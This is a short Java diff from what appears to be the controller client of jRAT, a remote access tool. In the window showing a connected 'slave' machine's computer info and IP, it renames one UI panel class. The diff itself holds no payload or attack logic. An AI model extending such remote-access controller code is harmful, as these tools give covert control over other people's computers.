@@ -7,7 +7,7 @@ import javax.swing.JPanel;
 import javax.swing.border.EmptyBorder;
 
 import se.jrat.client.Slave;
-import se.jrat.client.ui.panels.PanelControlComputerInfo;
+import se.jrat.client.ui.panels.PanelControlSystemInfo;
 
 @SuppressWarnings("serial")
 public class FrameComputerInfo extends JFrame {
@@ -21,7 +21,7 @@ public class FrameComputerInfo extends JFrame {
 		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
 		contentPane.setLayout(new BorderLayout(0, 0));
 		setContentPane(contentPane);
-		contentPane.add(new PanelControlComputerInfo(slave));
+		contentPane.add(new PanelControlSystemInfo(slave));
 		setTitle("Computer Info - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
 	}
 
